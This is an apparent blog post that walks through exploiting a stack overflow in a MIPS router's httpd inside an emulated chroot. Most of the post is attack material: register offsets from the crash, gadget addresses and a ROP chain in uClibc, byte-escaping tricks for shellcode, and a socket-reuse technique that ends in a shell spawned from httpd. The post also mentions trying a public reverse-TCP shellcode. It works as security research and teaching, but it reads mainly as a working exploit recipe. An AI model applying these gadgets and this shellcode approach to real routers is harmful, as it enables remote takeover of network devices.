---
layout: post
comments: true
title: "Exploiting a MIPS router"
tags: [MIPS, exploit]
---

## Testing environment

```
root@debian-mips:~# mount --bind /proc /tl-rootfs/proc/
root@debian-mips:~# chroot /tl-rootfs/ bin/sh


BusyBox v1.01 (2015.03.10-07:17+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.

# export LD_PRELOAD=/hook-mips.so
# httpd
```

## PoC

```
#0  0x61616561 in ?? ()
(gdb) i r
          zero       at       v0       v1       a0       a1       a2       a3
 R0   00000000 00000001 00000000 00000302 7d7fe878 00560000 00000002 00000000 
            t0       t1       t2       t3       t4       t5       t6       t7
 R8   00000000 00000000 00000000 86ffa000 00000000 7e1ffc14 61636661 00000000 
            s0       s1       s2       s3       s4       s5       s6       s7
 R16  61616261 61616361 61616461 00000005 00000000 00000007 00000000 0064c804 
            t8       t9       k0       k1       gp       sp       s8       ra
 R24  00000000 2aad2980 00000000 00000000 00594d80 7d7fed50 7d7fedf8 61616561 
            sr       lo       hi      bad    cause       pc
      0000a413 2deb3800 0000e72b 61616560 10800008 61616561 
           fsr      fir
      00000000 00000000
```

So we obtained the following offset for the registers we control

 - ``s0`` -> 3
 - ``s1`` -> 7
 - ``s2`` -> 11
 - ``pc`` -> 15
 - ``t6`` -> too far away

```
                    LAB_0043bc98
.text:0043bc98 8f bf 02 24     lw                 ra,local_4(sp)
.text:0043bc9c 8f b2 02 20     lw                 s2,local_8(sp)
.text:0043bca0 8f b1 02 1c     lw                 s1,local_c(sp)
.text:0043bca4 8f b0 02 18     lw                 s0,local_10(sp)
.text:0043bca8 03 e0 00 08     jr                 ra
.text:0043bcac 27 bd 02 28     _addiu             sp,sp,0x228
```

```
 ---- increasing addresses ---->

[   padding   ][  s0  ][  s1  ][  s2  ][  ra  ][   ?????   ]
                                                |
  sp points here after the oveflow  ------------'
```

## Ropchain

```
process 5886
cmdline = 'httpd'
cwd = '/tl-rootfs/tmp'
exe = '/tl-rootfs/usr/bin/httpd'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
          0x400000   0x561000   0x161000          0      /tl-rootfs/usr/bin/httpd
          0x571000   0x590000    0x1f000   0x161000      /tl-rootfs/usr/bin/httpd
          0x590000   0x66e000    0xde000          0           [heap]
        0x2aaa8000 0x2aaad000     0x5000          0      /tl-rootfs/lib/ld-uClibc.so.0
        0x2aaad000 0x2aaae000     0x1000          0        
        0x2aaae000 0x2aab2000     0x4000          0           /SYSV0000002f (deleted)
        0x2aabc000 0x2aabd000     0x1000     0x4000      /tl-rootfs/lib/ld-uClibc.so.0
        0x2aabd000 0x2aabe000     0x1000     0x5000      /tl-rootfs/lib/ld-uClibc.so.0
        0x2aabe000 0x2aabf000     0x1000          0      /tl-rootfs/hook-mips.so
        0x2aabf000 0x2aace000     0xf000          0        
        0x2aace000 0x2aacf000     0x1000          0      /tl-rootfs/hook-mips.so
        0x2aacf000 0x2aadc000     0xd000          0      /tl-rootfs/lib/libpthread.so.0
        0x2aadc000 0x2aaeb000     0xf000          0        
        0x2aaeb000 0x2aaec000     0x1000     0xc000      /tl-rootfs/lib/libpthread.so.0
        0x2aaec000 0x2aaf1000     0x5000     0xd000      /tl-rootfs/lib/libpthread.so.0
        0x2aaf1000 0x2aaf3000     0x2000          0        
        0x2aaf3000 0x2ab50000    0x5d000          0      /tl-rootfs/lib/libc.so.0
        0x2ab50000 0x2ab5f000     0xf000          0        
        0x2ab5f000 0x2ab60000     0x1000    0x5c000      /tl-rootfs/lib/libc.so.0
        0x2ab60000 0x2ab61000     0x1000    0x5d000      /tl-rootfs/lib/libc.so.0
```

So our base address to look for gadgets is ``0x2aaf3000``.

Now it's time to build our rop chain: first of all we start to take remedy
of cache incohorency calling ``sleep()``; to do that I use the already value
inside ``s3`` that I don't control (in this case equals to 5) so set the argument
for a future function call.

```
0x2ab36ce0: ~ $a0=5, jmp $s1
 move $t9, $s1 ;
 jalr $t9 ;
 move $a0, $s3
```

Since a function call will use the value into ``ra`` to return back we need to
find a gadget that sets that register and jump via another register. This is
not difficult to find, I think a lot of function epilogues are similar to
the following:

```
0x2ab31224 : ~ ra=0x24(sp), sp+=0x28, jmp $s2
 move $t9, $s2 ; 
 lw $ra, 0x24($sp) ; 
 lw $s2, 0x20($sp) ; 
 lw $s1, 0x1c($sp) ; 
 lw $s0, 0x18($sp) ; 
 jr $t9 ; 
 addiu $sp, $sp, 0x28
```

The plus side is that we can reload the registers with other values just in case
is necessary. Also the stack is moved further up (fortunately we have space to spare).

```
 ---- increasing addresses ---->
                                               ,---- 0x18 ----.
[   padding   ][  s0  ][  s1  ][  s2  ][  ra  ][    unused    ][  s0  ][  s1  ][  s2  ][  ra  ][ ????
                                                |                                              |
  sp points here at the beginning   ------------'      sp points here at the end   ------------'
```

Since the stack is executable I can act like it's 90s again and jump into it
to execute something; this gadget loads in ``v0`` the stack's address with an offset
and jump where the value of ``s0`` points to (also writes ``v0`` back in the stack
but fortunately at an offset that doesn't interfere with our stack juggling)

```
0x2ab3560c : ~ v0 = sp + 0x40, a2 = sp + 0x18, jmp s0
 addiu $v0, $sp, 0x40 ; 
 ori $a1, $zero, 0x8912 ; 
 addiu $a2, $sp, 0x18 ; 
 move $t9, $s0 ; 
 jalr $t9 ; 
 sw $v0, 0x1c($sp)
```

and then, finally, we can jump to it with the simplest of all the gadgets:

```
0x2ab0e2a8 : ~ jmp v0
 jr $v0 ; nop 
```

```
 ---- increasing addresses ---->
                                               ,---- 0x18 ----.                                ,---- 0x40 ----.
[   padding   ][  s0  ][  s1  ][  s2  ][  ra  ][    unused    ][  s0  ][  s1  ][  s2  ][  ra  ][    unused    ][ shellcode...
                                                                                               |
                                                                    sp points here ------------'
```

## Shellcode - 1st blood

Arrived at this point we can write the code as we like it since we have total
control, a part from the little annoying escaping thing.

At first I tried teh following [Linux/MIPS (Big Endian) - execve(/bin/sh) + Reverse TCP Shellcode (181 bytes)](https://www.exploit-db.com/exploits/45541)
but as you can see a sequence like

```
\x3c\x0e\x11\x5d      # lui     $t6, 0x115d ( sin_port = 4445 )
```

contains the ``0x3c`` byte or well known as ``<``; the simple solution is
to add a jump to the correct code and 3 bytes to pad the escaping
but bad enough the ``b`` family of instructions with a little offset
contains a ``NULL`` byte in the opcode (``asm`` is a command line tool provided
by the pwntools python library)

```
$ asm -c mips 'bne $t8, $t8, miao;nop;miao:' -f raw | disasm -c mips
   0:    17180001         bne     t8,  t8,  0x8
   4:    00000000         nop
```

so I prefered to add an instruction that set the register
that just after will be re-set, with the last byte of the
opcode be the infamous escape character:

```
$ asm -c mips 'ori $t6, $t6, 0xff3c' -f raw | disasm -c mips
   0:    35ceff3c         ori     t6,  t6,  0xff3c
```

At the point I tried the shellcode but failed  because I didn't have
enough space: the vulnerable function copies ``0x200`` bytes as maximum from the source buffer,
taking into account that we used ``0x55*len('/\n') = 0xaa`` bytes we have ``0x156`` to use
(including the various registers to set in the ropchain) we must remove 0x18 + 0x40 + 0x10 that
are unusable.

Strange fact is that it kinda works because when I trigger it the netcat
receives the log from the main thread, the log that I see from the terminal
from where I launched ``httpd``; my educated guess is that is using the value
in the register ``a0`` (i.e. 5) as a file descriptor.

## Use the source Luke

This mistake reminds me that in reality I don't need to open a connection,
I have already a connection opened: the one that I'm using to send the exploit!

Now the tricky part: I would like to find somewhere a point where the socket
is used and if there is any reminiscence of it somewhere; after a little
digging using ``ghidra`` I finally found a way! Bear with me.

If we analyze the instructions we see that when the ``writePageParamSet()``
function is called the ``req`` instance is passed via the register ``s7``;
after that, internally, ``stringModify()`` is called (that causes the overflow),
and at the same frame is called ``httpPrintf()``.

Fortunately one of the inner calls store ``s7`` in the stack! The following
diagram tries to explain the concept

```
void writePageParamSet(request_t *req,char *fmt,char *value)
 lui                a1,0x54
 addiu              a1=>s_"%s",_00544d38,a1,0x4d38                   = "\"%s\","
 lw                 t9,-0x5694(gp)=>->writePageParamSet              = 0043bba0
 move               a0,s7
 addiu              a2,sp,0xcc
 jalr               t9=>writePageParamSet
    int stringModify(char *dst,size_t size,char *src)
    int httpPrintf(request_t *req,char *fmt,...)
        addiu              sp,sp,-0x28
        lw                 a0,0x34(a0) ; a0 = req->socket

        int wmnetSocketVprintf(int fd,char *fmt,va_list vaList,int *nWrite)
            addiu              sp,sp,-0x20

            int vfdprintf(int fd,char *fmt,va_list list)
             addiu              sp,sp,-0x210
             sw                 ra,0x20c(sp)
             sw                 s8,0x208(sp)
             sw                 s7,0x204(sp)
             sw                 s6,0x200(sp)
```

Since is all deterministic, we can add the offsets and find out where the
``req`` address is stored, i.e. ``-0x480 + 0x204`` bytes from where the stack
pointer is when we control the ``pc`` register; Let me double check
with ``gdb`` in a running instance:

```
(gdb) print/x 0x228 + 0x28 + 0x20 + 0x210
$4 = 0x480
(gdb) x/10xw (int*)($sp - 0x480 + 0x204)
0x7d3fead4:     0x0064c804      0x7d3fedf8      0x0050cf0c      0x00544d3d
0x7d3feae4:     0x00000000      0x7d3fed44      0x0000000e      0x00594d80
0x7d3feaf4:     0x0051fc64      0x7d3fee1c
```

``0x0064c804`` indeed is a value of memory located in the **heap**;
now we can add the offset to reach the ``socket`` variabile inside ``req``

```
(gdb) x/xw (*(int*)($sp - 0x480 + 0x204) + 0x34)
0x64c838:       0x0000000e
```

To double check that this file descriptor makes sense we can dig more information
inside the ``/proc`` pseudo filesystem

```
(gdb) info proc
process 25517
cmdline = 'httpd'
cwd = '/tl-rootfs/tmp'
exe = '/tl-rootfs/usr/bin/httpd'
(gdb) shell ls -al /proc/25517/fd
fd/     fdinfo/
(gdb) shell ls -al /proc/25517/fd/
total 0
dr-x------ 2 root root  0 Jan 21 09:05 .
dr-xr-xr-x 6 root root  0 Jan 21 06:03 ..
lrwx------ 1 root root 64 Jan 21 09:21 0 -> /dev/ttyS0
lrwx------ 1 root root 64 Jan 21 09:21 1 -> /dev/ttyS0
lrwx------ 1 root root 64 Jan 21 09:21 10 -> socket:[3149]
lr-x------ 1 root root 64 Jan 21 09:21 11 -> /tl-rootfs/tmp/pipe_mud80
l-wx------ 1 root root 64 Jan 21 09:21 12 -> /tl-rootfs/tmp/pipe_mud80
lrwx------ 1 root root 64 Jan 21 09:21 13 -> socket:[3150]
lrwx------ 1 root root 64 Jan 21 09:21 14 -> socket:[18959]
   ...
```

The number between square brackets is the **inode** value that
we can use via another entry in ``/proc`` to find more information

```
(gdb) shell cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode         
   ...
   5: 0A00020F:0050 0A000202:8614 01 00000000:00000000 00:00000000 00000000     0        0 18959 1 86cf0d60 21 4 1 5 -1
   ...
(gdb) print/d 0x50
$5 = 80
```

It seems legit! Obviously we need to subtract also ``0x28`` from the stack pointer if we want
to use it from inside the shellcode.

```
$ asm -c mips 'lw $t6, -0x204($sp);lw $t6, 0x34($t6)' -f raw | disasm -c mips
   0:    8faefdfc         lw      t6,  -516(sp)
   4:    8dce0034         lw      t6,  52(t6)
```

lw $t6, 0x34($t6) ---> t6 = *(t6 + 0x34)

```
$ asm -c mips 'lw $t6, -0x204($sp);addi $t6, $t6, 0x101; lw $t6, -0xcd($t6)' -f raw | disasm -c mips
   0:    8faefdfc         lw      t6,  -516(sp)
   4:    21ce0101         addi    t6,  t6,  257
   8:    8dceff33         lw      t6,  -205(t6)
```

and at the end

```
 1599 ttyS0    Ss     0:00 /bin/login --
 1600 ttyS0    S      0:01  \_ -bash
 1615 ttyS0    S+     0:00      \_ bin/sh
26457 ttyS0    S+     0:11          \_ httpd
26458 ttyS0    S+     0:00              \_ httpd
26459 ttyS0    S+     0:00                  \_ httpd
26506 ttyS0    S+     0:00                  \_ httpd
26514 ttyS0    S+     0:00                  \_ httpd
26515 ttyS0    S+     0:00                  \_ httpd
30218 ttyS0    S+     0:00                  \_ httpd
30220 ttyS0    S+     0:00                  \_ httpd
30221 ttyS0    S+     0:00                  \_ httpd
30222 ttyS0    S+     0:00                  \_ httpd
18369 ttyS0    S+     0:00                  \_ httpd
18374 ttyS0    S+     0:00                  \_ httpd
18375 ttyS0    S+     0:35                  \_ httpd
18376 ttyS0    S+     0:57                  \_ httpd
18379 ttyS0    S+     0:00                  \_ httpd
18380 ttyS0    S+     0:00                  \_ httpd
18382 ttyS0    S+     0:03                  \_ httpd
18384 ttyS0    S+     0:00                  \_ sh
```

a beautiful ``sh`` session spawned from ``httpd`` :)

## Debug

```
(gdb) handle SIGPIPE nostop noprint pass
Signal        Stop      Print   Pass to program Description
SIGPIPE       No        No      Yes             Broken pipe
(gdb) b *0x2ab36ce0
(gdb) b *0x2ab0e2a8
Breakpoint 1 at 0x2ab36ce0
(gdb) c
Continuing.

Breakpoint 1, 0x2ab36ce0 in ?? ()
(gdb) display/3i $pc
1: x/3i $pc
0x2ab36ce0:     move    t9,s1
0x2ab36ce4:     jalr    t9
0x2ab36ce8:     move    a0,s3
```

```
(gdb) display/3i $pc
3: x/3i $pc
0x2ab36ce4:     jalr    t9
0x2ab36ce8:     move    a0,s3
0x2ab36cec:     beqz    v0,0x2ab36d2c
0x2ab36cf0:     lw      gp,16(sp)
```

```
(gdb) shell ps afx
  PID TTY      STAT   TIME COMMAND
    2 ?        S<     0:00 [kthreadd]
    3 ?        S<     0:00  \_ [migration/0]
 ...
 1126 ttyS0    Ss     0:00 /bin/login --
 1127 ttyS0    S      0:02  \_ -bash
 1142 ttyS0    S+     0:00      \_ bin/sh
22099 ttyS0    S+     0:17          \_ httpd
22100 ttyS0    S+     0:00              \_ httpd
22101 ttyS0    S+     0:00                  \_ httpd
22148 ttyS0    S+     0:00                  \_ httpd
22156 ttyS0    S+     0:00                  \_ httpd
22157 ttyS0    S+     0:00                  \_ httpd
25536 ttyS0    S+     0:00                  \_ httpd
25538 ttyS0    S+     0:00                  \_ httpd
25539 ttyS0    S+     0:00                  \_ httpd
25540 ttyS0    S+     0:00                  \_ httpd
 9958 ttyS0    S+     0:00                  \_ httpd
 9963 ttyS0    S+     0:00                  \_ httpd
 9964 ttyS0    S+     0:02                  \_ httpd
 9965 ttyS0    S+     0:03                  \_ httpd
 9968 ttyS0    S+     0:00                  \_ httpd
 9969 ttyS0    S+     0:00                  \_ httpd
 9971 ttyS0    S+     0:00                  \_ httpd
 9973 ttyS0    S+     0:00                  \_ httpd
(gdb) attach 9973
Attaching to process 9973
warning: process 9973 is a cloned process
Reading symbols from /tl-rootfs/usr/bin/httpd...(no debugging symbols found)...done.
 ...
```

## Links
 
 - [Advanced router exploitation](https://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf)
 - [Why is My Perfectly Good Shellcode Not Working?: Cache Coherency on MIPS and ARM](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm)
